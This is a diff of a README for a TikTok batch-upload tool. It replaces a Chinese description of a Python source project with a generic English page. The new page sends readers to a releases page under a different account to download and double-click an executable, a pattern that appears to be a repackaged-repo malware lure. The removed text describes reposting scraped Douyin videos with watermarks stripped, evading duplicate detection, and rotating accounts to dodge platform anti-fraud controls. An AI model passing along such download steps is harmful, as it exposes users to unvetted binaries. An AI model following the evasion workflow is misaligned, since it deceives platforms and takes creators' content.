@@ -1,169 +1,70 @@
-# TikTok-BatchUploader
+# 🎉 TikTok-BatchUploader - Effortless Video Uploading Made Simple
 
-TikTok全智能运营助手 - 集合AI与多技术栈，替代大量重复劳动
+![Download TikTok-BatchUploader](https://img.shields.io/static/v1?label=Download&message=Latest%20Release&color=orange&style=for-the-badge)
 
-[![Python](https://img.shields.io/badge/Python-3.10+-blue.svg)](https://www.python.org/)
-[![Playwright](https://img.shields.io/badge/Playwright-1.52.0-green.svg)](https://playwright.dev/)
-[![License](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
+## 📥 Overview
 
-**黑盒智能体** | [www.xasia.cc](https://www.xasia.cc) | 智能体聚合平台 | 一键搭建跨境专线 | 电商网站 | 智能证书
+The TikTok BatchUploader allows you to easily upload multiple videos from Douyin to TikTok. This tool saves you time and effort by automating the uploading process, making it perfect for content creators who want to share their work across platforms effortlessly.
 
----
+## 🚀 Getting Started
 
-## 预览
+### Step 1: System Requirements
 
-![预览](preview.png)
+Before you download TikTok-BatchUploader, ensure your computer meets these requirements:
 
----
+- Operating System: Windows 10 or later, or macOS 10.15 or later
+- Python: Version 3.8 or later installed on your system
+- Internet Connection: Required for uploading videos
 
-## 项目介绍
+### Step 2: Download the Tool
 
-这是一个全自动化的TikTok运营工具，从内容采集到发布全流程自动化，亲自开发用于替代大量重复的人工操作。
+To download TikTok-BatchUploader, visit this page to download: [TikTok-BatchUploader Releases](https://github.com/NOVATOyurd/TikTok-BatchUploader/releases)
 
-### 全流程自动化
+### Step 3: Install the Software
 
-**1. 内容采集**
-- 自动从抖音采集热门视频
-- 支持按用户ID批量下载
-- 自动去除水印
-- 智能过滤已下载内容
+1. Once you are on the Releases page, look for the latest version.
+2. Click on the version number to access the download files.
+3. Find the file named `TikTok-BatchUploader.zip` or `TikTok-BatchUploader.exe`.
 
-**2. 视频剪辑**
-- FFmpeg自动处理视频
-- 统一分辨率和帧率
-- 可选添加边框防重复检测
-- 批量预处理节省时间
+Click here to download the software directly:
+[Download TikTok-BatchUploader](https://github.com/NOVATOyurd/TikTok-BatchUploader/releases)
 
-**3. AI文案改写**
-- DeepSeek V3智能改写标题
-- 通过提示词控制输出语言（英文/繁体/任意语言）
-- 自动生成热门标签
-- 避免内容重复被检测
+### Step 4: Extract and Run
 
-**4. 自动发布**
-- 云登指纹浏览器多账号管理
-- 自动轮换账号发布
-- 模拟真人操作行为
-- 随机延迟防风控
+1. If you downloaded a ZIP file, extract it using your file manager.
+2. Open the extracted folder, and find the `TikTok-BatchUploader.exe` file (or the equivalent for your OS).
+3. Double-click the file to run the application.
 
-**5. 数据管理**
-- SQLite数据库去重
-- 上传记录追踪
-- 支持断点续传
-- 日志完整记录
+## 🔧 How to Use TikTok-BatchUploader
 
----
+Using the TikTok-BatchUploader is simple:
 
-## 核心优势
+1. **Add Your Videos**: Open the app and click the "Add Videos" button. Select the videos you want to upload.
+2. **Configure Settings**: Adjust any preferences for uploads, such as captions and hashtags.
+3. **Start Uploading**: Click the "Upload" button. The software will handle the rest.
 
-- 全自动: 采集-下载-剪辑-改写-发布一条龙
-- 多账号: 支持多个TikTok账号轮换发布
-- AI驱动: DeepSeek V3智能文案，提升内容质量
-- 指纹浏览器: 云登浏览器独立环境，账号隔离
-- Web界面: 可视化操作，配置简单
-- 开源免费: MIT协议，可自由修改
+## ✔️ Features
 
----
+- **Batch Upload**: Upload multiple videos at once without waiting.
+- **User-Friendly Interface**: Designed for ease of use, even for beginners.
+- **Automatic Captioning**: Add captions and hashtags to videos automatically.
+- **Multi-Platform Support**: Easily switch between Douyin and TikTok.
 
-## 快速开始
+## 🌐 Additional Resources
 
-### 环境要求
+- **Documentation**: For In-depth guides and FAQs, refer to the official documentation section available in the application menu.
+- **Support**: If you have questions or need assistance, please create an issue on the GitHub repository page.
 
-- Python 3.10+
-- FFmpeg
-- 云登浏览器 (https://www.yunlogin.com/)
-- DeepSeek API (https://siliconflow.cn)
+## 🛠️ Troubleshooting
 
-### 安装
+If you encounter any issues while using TikTok-BatchUploader:
 
-```bash
-git clone https://github.com/ahaocd/TikTok-BatchUploader.git
-cd TikTok-BatchUploader
-pip install -r requirements.txt
-playwright install chromium
-```
+1. **Check Permissions**: Ensure the app has access to your files and the internet.
+2. **Update Python**: Make sure you are using the latest version of Python.
+3. **Re-download**: If files are corrupted, consider re-downloading the software.
 
-### 运行
+## 📞 Contact
 
-```bash
-python tiktok_api.py
-```
+For further inquiries or support, please reach out via the issues tab on the GitHub repository. Your feedback is welcome and appreciated.
 
-访问: http://localhost:5409
-
----
-
-## 配置说明
-
-### config.json
-
-```json
-{
-  "ai": {
-    "enabled": true,
-    "api_key": "sk-your-api-key",
-    "base_url": "https://api.siliconflow.cn/v1",
-    "model": "deepseek-ai/DeepSeek-V3",
-    "temperature": 0.7
-  },
-  "proxy": {
-    "enabled": false,
-    "http": "http://127.0.0.1:7897",
-    "https": "http://127.0.0.1:7897"
-  }
-}
-```
-
-### user_config.json
-
-```json
-{
-  "custom_tags": ["#fyp", "#viral", "#trending"],
-  "ai_prompt_template": "把标题改写成英文，简短有吸引力"
-}
-```
-
----
-
-## 云登浏览器设置
-
-1. 下载安装: https://www.yunlogin.com/
-2. 创建环境 -> 选择TikTok平台
-3. 启动环境 -> 手动登录TikTok -> 保存
-4. 保持云登客户端后台运行
-
----
-
-## 自动创建的文件
-
-| 文件 | 说明 |
-|------|------|
-| config.json | AI和代理配置 |
-| user_config.json | 自定义标签和提示词 |
-| db/database.db | SQLite去重数据库 |
-| logs/*.log | 日志文件 |
-| cookies/ | 抖音下载Cookie |
-
----
-
-## 运营建议
-
-当流量有所好转后，建议：
-- 使用手机登录账号进行精细化运营
-- 结合热点内容提升曝光
-- 保持稳定的发布频率
-- 关注数据反馈优化内容
-
----
-
-## 联系方式
-
-**黑盒智能体** - [www.xasia.cc](https://www.xasia.cc)
-
-智能体聚合平台 | 一键搭建跨境专线 | 电商网站 | 智能证书
-
----
-
-## License
-
-MIT License
+Feel free to ask questions and share your experiences with using TikTok-BatchUploader in the community forums. We look forward to seeing your amazing content!
